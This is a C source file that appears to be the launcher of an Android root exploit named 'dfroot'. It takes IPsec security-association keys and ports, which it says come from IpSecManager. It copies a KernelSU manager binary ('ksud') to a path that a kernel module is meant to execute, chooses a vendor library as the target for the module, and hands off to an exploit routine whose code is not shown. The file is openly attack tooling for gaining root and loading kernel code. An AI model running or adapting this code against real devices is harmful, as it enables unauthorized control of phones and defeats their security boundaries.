#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "reporter.h"

/* The LKM execs this path, so the staged manager ksud has to land here. */
#define KSUD_DEST "/data/user_de/0/df.root/ksud"

int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
               const uint8_t aes_key[32], const uint8_t hmac_key[32],
               const char *ko_target, const char *package_name, int soft_reboot);

static struct Reporter g_reporter;
static struct Reporter *reporter = &g_reporter;

void reportfmt(struct Reporter *r, const char *fmt, ...) {
    (void)r;
    va_list va;
    va_start(va, fmt);
    vfprintf(stdout, fmt, va);
    va_end(va);
    fflush(stdout);
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2)
        return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1)
            return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

static const char *detect_ko_target(void) {
    static const char *const candidates[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return candidates[0];
}

static int copy_file(const char *src, const char *dst) {
    int in = open(src, O_RDONLY);
    if (in < 0) {
        REPORTLN("open %s failed: %s", src, strerror(errno));
        return -1;
    }
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out < 0) {
        REPORTLN("open %s failed: %s", dst, strerror(errno));
        close(in);
        return -1;
    }
    char buf[65536];
    ssize_t n;
    while ((n = read(in, buf, sizeof(buf))) > 0) {
        char *p = buf;
        while (n > 0) {
            ssize_t w = write(out, p, (size_t)n);
            if (w < 0) {
                REPORTLN("write %s failed: %s", dst, strerror(errno));
                close(in);
                close(out);
                return -1;
            }
            p += w;
            n -= w;
        }
    }
    close(in);
    close(out);
    if (chmod(dst, 0755) != 0) {
        REPORTLN("chmod %s failed: %s", dst, strerror(errno));
        return -1;
    }
    return 0;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX "
            "--hmac-key HEX --ksud-src PATH --pkg NAME [--soft-reboot]\n"
            "  the SA parameters come from IpSecManager, which installs the\n"
            "  transform on the app's behalf\n", argv0);
}

int main(int argc, char **argv) {
    int encap_port = 0, sender_port = 0, icv_len = 16;
    uint32_t spi = 0;
    uint8_t aes_key[32], hmac_key[32];
    int have_aes = 0, have_hmac = 0;
    const char *ksud_src = NULL;
    const char *package_name = NULL;
    int soft_reboot = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--icv-len") && i + 1 < argc)
            icv_len = atoi(argv[++i]);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else if (!strcmp(a, "--hmac-key") && i + 1 < argc)
            have_hmac = hex_to_bytes(argv[++i], hmac_key, sizeof(hmac_key)) == 0;
        else if (!strcmp(a, "--ksud-src") && i + 1 < argc)
            ksud_src = argv[++i];
        else if (!strcmp(a, "--pkg") && i + 1 < argc)
            package_name = argv[++i];
        else if (!strcmp(a, "--soft-reboot"))
            soft_reboot = 1;
        else {
            usage(argv[0]);
            return 2;
        }
    }
    if (!encap_port || !sender_port || !spi || !have_aes || !have_hmac ||
        !ksud_src || !package_name) {
        usage(argv[0]);
        return 2;
    }

    REPORTLN("=== setup ===");
    REPORTLN("encap port: %d", encap_port);
    REPORTLN("spi: 0x%x", spi);
    if (copy_file(ksud_src, KSUD_DEST) != 0)
        return 1;
    REPORTLN("ksud staged to: %s (manager: %s)", KSUD_DEST, ksud_src);

    const char *ko_target = detect_ko_target();
    REPORTLN("found ko_target: %s", ko_target);

    REPORTLN("");
    REPORTLN("=== exploit ===");
    return dfroot_run(encap_port, sender_port, spi, icv_len, aes_key, hmac_key,
                      ko_target, package_name, soft_reboot);
}
